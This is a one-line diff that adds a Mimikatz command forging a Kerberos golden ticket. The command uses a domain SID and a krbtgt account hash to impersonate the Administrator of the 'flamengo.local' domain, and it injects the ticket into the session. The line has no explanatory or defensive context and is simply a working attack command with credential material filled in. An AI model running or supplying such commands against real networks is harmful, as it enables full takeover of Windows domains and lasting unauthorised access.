@@ -1,0 +1,1 @@
+kerberos::golden /domain:flamengo.local /sid:S-1-5-21-1619248061-3916858968-890932660 /user:Administrator /krbtgt:36d5f9b0b14e7b1f118415e4d6d2812b /ptt
